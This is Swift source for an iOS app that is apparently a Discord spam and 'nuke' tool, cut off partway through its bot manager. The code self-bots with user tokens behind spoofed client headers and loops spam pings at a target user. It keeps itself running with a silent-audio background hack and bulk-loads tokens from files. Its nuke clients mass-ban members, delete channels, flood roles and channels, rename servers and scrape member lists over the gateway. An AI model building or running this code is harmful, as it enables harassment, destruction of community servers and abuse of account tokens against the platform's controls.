import SwiftUI
import Foundation
import AVFoundation
import UniformTypeIdentifiers
import UIKit

// ==========================================
// MARK: - DOCUMENT PICKER
// ==========================================
struct DocumentPicker: UIViewControllerRepresentable {
    let contentTypes: [UTType]
    let onPick: (URL) -> Void
    let onCancel: (() -> Void)?

    init(contentTypes: [UTType] = [.item],
         onPick: @escaping (URL) -> Void,
         onCancel: (() -> Void)? = nil) {
        self.contentTypes = contentTypes
        self.onPick = onPick
        self.onCancel = onCancel
    }
    func makeCoordinator() -> Coordinator { Coordinator(self) }
    func makeUIViewController(context: Context) -> UIDocumentPickerViewController {
        let p = UIDocumentPickerViewController(forOpeningContentTypes: contentTypes, asCopy: true)
        p.allowsMultipleSelection = false
        p.delegate = context.coordinator
        return p
    }
    func updateUIViewController(_ vc: UIDocumentPickerViewController, context: Context) {}
    final class Coordinator: NSObject, UIDocumentPickerDelegate {
        let parent: DocumentPicker
        init(_ p: DocumentPicker) { self.parent = p }
        func documentPicker(_ c: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
            guard let u = urls.first else { return }
            parent.onPick(u)
        }
        func documentPickerWasCancelled(_ c: UIDocumentPickerViewController) { parent.onCancel?() }
    }
}

// ==========================================
// MARK: - MODELS
// ==========================================
struct DiscordUser: Codable {
    let id, username: String
    let globalName, avatar: String?
}

struct TokenInfo: Identifiable, Codable, Equatable {
    var id = UUID()
    let token: String
    var userId, username: String
    var avatarHash: String?
    var isValid: Bool

    var avatarURL: URL? {
        guard let h = avatarHash else { return nil }
        return URL(string: "https://cdn.discordapp.com/avatars/\(userId)/\(h).png?size=128")
    }
    var initial: String { String(username.prefix(1)).uppercased() }
}

struct Guild: Codable, Identifiable, Hashable { let id, name: String; let icon: String? }

struct Channel: Codable, Identifiable, Hashable {
    let id: String
    let name: String?
    let type: Int
    let position: Int?
    let parentId: String?
    var isSendableText: Bool { type == 0 || type == 5 }
    var isCategory: Bool { type == 4 }
    var displayName: String { name ?? "không tên" }
}

struct ParsedMessage: Identifiable, Hashable { let id = UUID(); let body: String }

struct BotInfo: Codable {
    let id, username: String
    let discriminator, avatar: String?
    let bot: Bool?
}

struct BotConfig: Codable {
    var token, username, userId: String
    var avatarHash, discriminator: String?
    var displayName: String {
        if let d = discriminator, d != "0" { return "\(username)#\(d)" }
        return username
    }
    var avatarURL: URL? {
        guard let h = avatarHash else { return nil }
        return URL(string: "https://cdn.discordapp.com/avatars/\(userId)/\(h).png?size=128")
    }
    var initial: String { String(username.prefix(1)).uppercased() }
}

struct GuildRole: Codable { let id, name: String; let position: Int }
struct BotMember: Codable { let user: BotMemberUser?; let roles: [String]? }
struct BotMemberUser: Codable { let id: String; let username: String?; let bot: Bool? }

struct NukeGuild: Codable {
    let id, name: String
    let icon: String?
    let permissions: String
    let owner: Bool?
    var bits: UInt64 { UInt64(permissions) ?? 0 }
    var isOwner: Bool { owner ?? false }
    var isAdmin: Bool { bits & (1 << 3) != 0 }
    var canManageGuild: Bool { bits & (1 << 5) != 0 }
    var canManageChannels: Bool { bits & (1 << 4) != 0 }
    var canBan: Bool { bits & (1 << 2) != 0 }
    var canNuke: Bool { isOwner || isAdmin || (canManageGuild && canManageChannels && canBan) }
}

struct NukeConfig {
    var doMassBan = false
    var doDeleteChannels = false
    var doCreateRoles = false
    var doCreateChannels = true
    var doRenameGuild = false
    var banRoleId = ""
    var roleName = "Ceker Cute"
    var roleCount = 50
    var channelName = "nuked-by-tool"
    var channelCount = 50
    var messageContent = ""
    var tagEveryone = true
    var newGuildName = ""
}

// ==========================================
// MARK: - BACKGROUND MANAGER
// ==========================================
class BackgroundManager {
    static let shared = BackgroundManager()
    private var audioPlayer: AVAudioPlayer?
    private var bgTask: UIBackgroundTaskIdentifier = .invalid
    func start() {
        bgTask = UIApplication.shared.beginBackgroundTask { [weak self] in self?.stop() }
        do {
            try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
            try AVAudioSession.sharedInstance().setActive(true)
            let sr = 8000, ds = sr * 2
            var h = Data()
            h.append(contentsOf: [0x52,0x49,0x46,0x46])
            var cs = UInt32(36 + ds).littleEndian; h.append(Data(bytes: &cs, count: 4))
            h.append(contentsOf: [0x57,0x41,0x56,0x45,0x66,0x6d,0x74,0x20])
            var sc1 = UInt32(16).littleEndian; h.append(Data(bytes: &sc1, count: 4))
            var af = UInt16(1).littleEndian; h.append(Data(bytes: &af, count: 2))
            var nc = UInt16(1).littleEndian; h.append(Data(bytes: &nc, count: 2))
            var srl = UInt32(sr).littleEndian; h.append(Data(bytes: &srl, count: 4))
            var br = UInt32(sr * 2).littleEndian; h.append(Data(bytes: &br, count: 4))
            var ba = UInt16(2).littleEndian; h.append(Data(bytes: &ba, count: 2))
            var bps = UInt16(16).littleEndian; h.append(Data(bytes: &bps, count: 2))
            h.append(contentsOf: [0x64,0x61,0x74,0x61])
            var dcs = UInt32(ds).littleEndian; h.append(Data(bytes: &dcs, count: 4))
            audioPlayer = try AVAudioPlayer(data: h + Data(repeating: 0, count: ds))
            audioPlayer?.numberOfLoops = -1
            audioPlayer?.play()
        } catch {}
    }
    func stop() {
        audioPlayer?.stop(); audioPlayer = nil
        if bgTask != .invalid { UIApplication.shared.endBackgroundTask(bgTask); bgTask = .invalid }
    }
}

// ==========================================
// MARK: - DISCORD CLIENT (SPAM)
// ==========================================
class DiscordClient {
    let token: String
    let session: URLSession
    init(token: String) {
        self.token = token
        let cfg = URLSessionConfiguration.default
        let sp = """
        {"os":"Mac OS X","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36","browser_version":"126.0.0.0","os_version":"10.15.7","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
        """
        cfg.httpAdditionalHeaders = [
            "Authorization": token, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "X-Super-Properties": Data(sp.utf8).base64EncodedString(), "X-Discord-Locale": "en-US"
        ]
        self.session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse, (200...299).contains(h.statusCode) else {
            throw NSError(domain: "D", code: (res as? HTTPURLResponse)?.statusCode ?? 0,
                          userInfo: [NSLocalizedDescriptionKey: String(data: data, encoding: .utf8) ?? ""])
        }
    }
    func validateToken() async throws -> DiscordUser {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getAllGuilds() async throws -> [Guild] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getAllChannels(guildId: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(guildId)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func sendMessage(channelId: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(channelId)/messages")!)
        req.httpMethod = "POST"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req)
        if let http = r as? HTTPURLResponse, http.statusCode == 429,
           let json = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
           let retry = json["retry_after"] as? Double {
            try await Task.sleep(nanoseconds: UInt64((retry + 0.5) * 1_000_000_000))
            return try await sendMessage(channelId: channelId, content: content)
        }
        try check(r, d)
    }
}

// ==========================================
// MARK: - APP STATE (SPAM) — storage key: "SpamTokensV2"
// ==========================================
@MainActor
class AppState: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var activeToken: TokenInfo? = nil
    @Published var isCheckingToken = false
    @Published var guilds: [Guild] = []
    @Published var channels: [Channel] = []
    @Published var isLoading = false
    @Published var delaySeconds: Double = 2.0
    @Published var useTag: Bool = true
    @Published var targetUserId = ""
    @Published var addPrefix = false
    @Published var addSuffix = false
    @Published var inputText = ""
    @Published var messages: [ParsedMessage] = []
    @Published var isSending = false
    @Published var totalSent = 0
    @Published var currentMessageStr = ""
    @Published var lastError: String?

    private let storageKey = "SpamTokensV2"
    private var client: DiscordClient? { activeToken.map { DiscordClient(token: $0.token) } }
    private var isCancelled = false
    private var sendTask: Task<Void, Never>?

    init() { migrateIfNeeded(); loadTokens() }

    private func migrateIfNeeded() {
        if UserDefaults.standard.data(forKey: storageKey) == nil,
           let old = UserDefaults.standard.data(forKey: "SavedTokens") {
            UserDefaults.standard.set(old, forKey: storageKey)
        }
    }
    private func saveTokens() {
        if let e = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(e, forKey: storageKey) }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: storageKey),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) {
            self.tokens = s
            if let a = s.first(where: { $0.isValid }) {
                self.activeToken = a
                Task { await loadGuilds() }
            }
        }
    }

    func addToken(_ s: String) async {
        let clean = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !clean.isEmpty, !tokens.contains(where: { $0.token == clean }) else { return }
        isCheckingToken = true
        do {
            let u = try await DiscordClient(token: clean).validateToken()
            let t = TokenInfo(token: clean, userId: u.id, username: u.globalName ?? u.username,
                              avatarHash: u.avatar, isValid: true)
            tokens.append(t)
            if activeToken == nil { setActiveToken(t) }
        } catch {
            tokens.append(TokenInfo(token: clean, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
        }
        isCheckingToken = false
    }
    func addTokensFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let coord = NSFileCoordinator()
        var err: NSError?
        coord.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { lastError = "Không đọc được file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { lastError = "File rỗng"; return }
        let clean = t.replacingOccurrences(of: "\u{FEFF}", with: "")
        for line in clean.components(separatedBy: .newlines) where !line.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            await addToken(line)
        }
        lastError = nil
    }
    func setActiveToken(_ t: TokenInfo) {
        guard t.isValid else { return }
        activeToken = t
        Task { await loadGuilds() }
    }
    func deleteToken(at offsets: IndexSet) {
        if let a = activeToken, offsets.map({ tokens[$0] }).contains(where: { $0.id == a.id }) {
            activeToken = nil; guilds = []
        }
        tokens.remove(atOffsets: offsets)
    }
    func loadGuilds() async {
        guard let c = client else { return }
        isLoading = true
        do { guilds = try await c.getAllGuilds().sorted { $0.name < $1.name } }
        catch { lastError = error.localizedDescription }
        isLoading = false
    }
    func loadChannels(for g: Guild) async {
        guard let c = client else { return }
        isLoading = true
        do {
            let all = try await c.getAllChannels(guildId: g.id)
            channels = all.filter { $0.isSendableText || $0.isCategory }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
        } catch { lastError = error.localizedDescription }
        isLoading = false
    }
    func groupedChannels() -> [(category: Channel?, items: [Channel])] {
        var secs: [(Channel?, [Channel])] = []
        let orp = channels.filter { $0.isSendableText && $0.parentId == nil }
        if !orp.isEmpty { secs.append((nil, orp)) }
        for cat in channels where cat.isCategory {
            let kids = channels.filter { $0.isSendableText && $0.parentId == cat.id }
            if !kids.isEmpty { secs.append((cat, kids)) }
        }
        return secs
    }
    func parseFile(url: URL) {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let coord = NSFileCoordinator()
        var err: NSError?
        coord.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { lastError = "Không đọc file"; return }
        var content: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii, .nonLossyASCII] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { content = s; break }
        }
        if content == nil || content!.isEmpty { content = String(decoding: d, as: UTF8.self) }
        guard let fc = content, !fc.isEmpty else { lastError = "File rỗng"; return }
        inputText = fc.replacingOccurrences(of: "\u{FEFF}", with: "")
        parseDirectInput()
        lastError = nil
    }
    func parseDirectInput() {
        messages = inputText.components(separatedBy: .newlines).compactMap {
            let t = $0.trimmingCharacters(in: .whitespacesAndNewlines)
            return t.isEmpty ? nil : ParsedMessage(body: t)
        }
    }
    func startSending(channel: Channel) {
        guard let c = client, !messages.isEmpty else { return }
        if useTag && targetUserId.isEmpty { return }
        isSending = true; isCancelled = false; totalSent = 0; lastError = nil
        BackgroundManager.shared.start()
        sendTask = Task { [weak self] in
            guard let self = self else { return }
            var i = 0
            while !self.isCancelled && !Task.isCancelled {
                let msg = self.messages[i]
                var pre = ""
                if self.addPrefix { pre += "> " }
                if self.addSuffix { pre += "# " }
                var fc = pre + msg.body
                if self.useTag { fc += " <@\(self.targetUserId)>" }
                self.currentMessageStr = fc
                do { try await c.sendMessage(channelId: channel.id, content: fc); self.totalSent += 1 }
                catch { self.lastError = error.localizedDescription }
                i = (i + 1) % self.messages.count
                let delay = max(0.1, self.delaySeconds + Double.random(in: -0.3...0.3) * self.delaySeconds)
                do { try await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000)) } catch { break }
            }
            self.isSending = false; self.currentMessageStr = ""
        }
    }
    func stopSending() {
        isCancelled = true; sendTask?.cancel(); sendTask = nil; isSending = false
        BackgroundManager.shared.stop()
    }
    func hideKeyboard() {
        UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil)
    }
}

// ==========================================
// MARK: - BOT CLIENT
// ==========================================
class BotClient {
    let auth: String
    let session: URLSession
    static let EVERYONE_ALLOW: UInt64 = (1<<10)|(1<<11)|(1<<16)|(1<<15)|(1<<14)|(1<<6)|(1<<17)
    init(token: String) {
        let clean = token.trimmingCharacters(in: .whitespacesAndNewlines)
        self.auth = clean.lowercased().hasPrefix("bot ") ? clean : "Bot \(clean)"
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 30
        cfg.httpAdditionalHeaders = ["Authorization": auth, "Content-Type": "application/json",
                                     "User-Agent": "DiscordBot (https://example.com, 1.0)"]
        self.session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else {
            throw NSError(domain: "B", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"])
        }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "B", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    func validate() async throws -> BotInfo {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(BotInfo.self, from: d)
    }
    func getGuilds() async throws -> [Guild] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getGuildDetail(_ gid: String) async throws -> [String: Any] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
        try check(r, d)
        return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ gid: String) async throws -> [GuildRole] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ gid: String, userId: String) async throws -> BotMember {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/members/\(userId)")!)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getMembers(_ gid: String, after: String = "0") async throws -> [BotMember] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/members?limit=1000&after=\(after)")!)
        try check(r, d); return try JSONDecoder().decode([BotMember].self, from: d)
    }
    func getChannels(_ gid: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ cid: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)")!)
        req.httpMethod = "DELETE"
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ gid: String, name: String, openEveryone: Bool) async throws -> String? {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone {
            p["permission_overwrites"] = [["id": gid, "type": 0,
                                           "allow": String(BotClient.EVERYONE_ALLOW), "deny": "0"]]
        }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ cid: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)/messages")!)
        req.httpMethod = "POST"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ gid: String, name: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
        req.httpMethod = "POST"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ gid: String, newName: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
        req.httpMethod = "PATCH"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ gid: String, userId: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/bans/\(userId)")!)
        req.httpMethod = "PUT"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
}

// ==========================================
// MARK: - USER NUKE CLIENT
// ==========================================
class UserNukeClient {
    let token: String
    let session: URLSession
    static let EVERYONE_ALLOW: UInt64 = (1<<10)|(1<<11)|(1<<16)|(1<<15)|(1<<14)|(1<<6)|(1<<17)
    init(token: String) {
        self.token = token
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 30
        let sp = """
        {"os":"iOS","browser":"Safari","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15","browser_version":"17.0","os_version":"17.0","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
        """
        cfg.httpAdditionalHeaders = [
            "Authorization": token, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "X-Super-Properties": Data(sp.utf8).base64EncodedString(),
            "X-Discord-Locale": "en-US", "X-Discord-Timezone": "Asia/Ho_Chi_Minh",
            "X-Context-Properties": "e30=", "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me"
        ]
        self.session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else {
            throw NSError(domain: "UN", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"])
        }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "UN", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    func validate() async throws -> DiscordUser {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getGuildsWithPerms() async throws -> [NukeGuild] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([NukeGuild].self, from: d)
    }
    func getGuildDetail(_ gid: String) async throws -> [String: Any] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
        try check(r, d)
        return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ gid: String) async throws -> [GuildRole] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ gid: String, uid: String) async throws -> BotMember {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/members/\(uid)")!)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getChannels(_ gid: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ cid: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)")!)
        req.httpMethod = "DELETE"
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ gid: String, name: String, openEveryone: Bool) async throws -> String? {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone {
            p["permission_overwrites"] = [["id": gid, "type": 0,
                                           "allow": String(UserNukeClient.EVERYONE_ALLOW), "deny": "0"]]
        }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ cid: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)/messages")!)
        req.httpMethod = "POST"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ gid: String, name: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
        req.httpMethod = "POST"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ gid: String, newName: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
        req.httpMethod = "PATCH"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ gid: String, uid: String) async throws {
        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/bans/\(uid)")!)
        req.httpMethod = "PUT"
        req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }

    // --- WebSocket member fetch ---
    func fetchMembersWS(guildId: String,
                        onMember: @escaping ([String: Any]) -> Void,
                        onProgress: @escaping (Int) -> Void) async throws {
        let channels = try await getChannels(guildId)
        guard let refId = channels.first(where: { $0.type == 0 || $0.type == 5 })?.id else { return }
        let detail = try await getGuildDetail(guildId)
        let total = (detail["approximate_member_count"] as? Int) ?? (detail["member_count"] as? Int) ?? 1000
        guard let url = URL(string: "wss://gateway.discord.gg/?v=10&encoding=json") else { return }
        let ws = session.webSocketTask(with: url)
        ws.resume()
        defer { ws.cancel(with: .goingAway, reason: nil) }

        guard case .string(let helloStr) = try await ws.receive(),
              let hd = helloStr.data(using: .utf8),
              let hello = try? JSONSerialization.jsonObject(with: hd) as? [String: Any],
              let hbInt = (hello["d"] as? [String: Any])?["heartbeat_interval"] as? Int else { return }
        let hbInterval = Double(hbInt) / 1000.0

        let hbTask = Task {
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(hbInterval * 1_000_000_000))
                try? await ws.send(.string("{\"op\":1,\"d\":null}"))
            }
        }
        defer { hbTask.cancel() }

        let identify: [String: Any] = ["op": 2, "d": [
            "token": token, "capabilities": 125,
            "properties": ["os": "iOS", "browser": "Safari", "device": "iPhone"],
            "compress": false,
            "presence": ["status": "online", "since": 0, "activities": [], "afk": false]
        ]]
        try await ws.send(.string(String(data: try JSONSerialization.data(withJSONObject: identify), encoding: .utf8)!))

        var ready = false; var att = 0
        while !ready && att < 50 {
            att += 1
            if case .string(let s) = try await ws.receive(),
               let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any] {
                if (d["t"] as? String) == "READY" { ready = true }
                if (d["op"] as? Int) == 9 { throw NSError(domain: "WS", code: 9, userInfo: [NSLocalizedDescriptionKey: "Invalid Session"]) }
            }
        }
        guard ready else { return }

        var seen = Set<String>()
        var start = 0, end = 99
        var emptyStreak = 0
        let maxIter = max(50, total / 100 + 20)
        var iter = 0
        while emptyStreak < 2 && iter < maxIter && !Task.isCancelled {
            iter += 1
            let req: [String: Any] = ["op": 14, "d": [
                "guild_id": guildId, "channels": [refId: [[start, end]]],
                "threads": false, "typing": true
            ]]
            try await ws.send(.string(String(data: try JSONSerialization.data(withJSONObject: req), encoding: .utf8)!))
            var gotNew = false
            let deadline = Date().addingTimeInterval(3.0)
            while Date() < deadline && !Task.isCancelled {
                let recv = Task { try await ws.receive() }
                let to = Task { try? await Task.sleep(nanoseconds: 3_000_000_000); recv.cancel() }
                defer { to.cancel() }
                do {
                    let msg = try await recv.value
                    if case .string(let s) = msg,
                       let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any],
                       (d["t"] as? String) == "GUILD_MEMBER_LIST_UPDATE",
                       let dd = d["d"] as? [String: Any],
                       let ops = dd["ops"] as? [[String: Any]] {
                        for op in ops {
                            let t = op["op"] as? String
                            let items: [[String: Any]]
                            if t == "SYNC" { items = op["items"] as? [[String: Any]] ?? [] }
                            else if t == "UPDATE" { items = (op["item"] as? [String: Any]).map { [$0] } ?? [] }
                            else { continue }
                            for item in items {
                                if let m = item["member"] as? [String: Any],
                                   let u = m["user"] as? [String: Any],
                                   let uid = u["id"] as? String, !seen.contains(uid) {
                                    seen.insert(uid); gotNew = true; onMember(m)
                                }
                            }
                        }
                        onProgress(seen.count)
                        if seen.count >= total { return }
                        if gotNew { break }
                    }
                } catch { break }
            }
            emptyStreak = gotNew ? 0 : emptyStreak + 1
            start += 100; end += 100
            try? await Task.sleep(nanoseconds: 150_000_000)
        }
    }

    func fetchMembersHTTP(guildId: String,
                          onMember: @escaping ([String: Any]) -> Void,
                          onProgress: @escaping (Int) -> Void) async {
        var after = "0"; var count = 0
        while !Task.isCancelled {
            do {
                let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(guildId)/members?limit=1000&after=\(after)")!)
                guard let http = r as? HTTPURLResponse, http.statusCode == 200 else { return }
                guard let arr = try? JSONSerialization.jsonObject(with: d) as? [[String: Any]] else { return }
                if arr.isEmpty { return }
                for m in arr { onMember(m) }
                count += arr.count
                onProgress(count)
                if arr.count < 1000 { return }
                after = ((arr.last?["user"] as? [String: Any])?["id"] as? String) ?? after
                try? await Task.sleep(nanoseconds: 500_000_000)
            } catch { return }
        }
    }
}

// ==========================================
// MARK: - BOT MANAGER — storage key: "BotNukeConfigV2"
// ==========================================
@MainActor
class BotManager: ObservableObject {
    @Published var config: BotConfig? = nil { didSet { saveConfig() } }
    @Published var isCheckingToken = false
    @Published var tokenError: String?
    @Published var botGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0

    private var isCancelled = false
    private let configKey = "BotNukeConfigV2"
    private var client: BotClient? { config.map { BotClient(token: $0.token) } }

    init() { migrateIfNeeded(); loadConfig() }

    private func migrateIfNeeded() {
        if UserDefaults.standard.data(forKey: configKey) == nil,
           let old = UserDefaults.standard.data(forKey: "BotConfigV1") {
            UserDefaults.standard.set(old, forKey: configKey)
        }
    }
    private func saveConfig() {
        if let c = config, let d = try? JSONEncoder().encode(c) {
            UserDefaults.standard.set(d, forKey: configKey)
        } else { UserDefaults.standard.removeObject(forKey: configKey) }
    }
    private func loadConfig() {
        if let d = UserDefaults.standard.data(forKey: configKey),
           let c = try? JSONDecoder().decode(BotConfig.self, from: d) {
            config = c
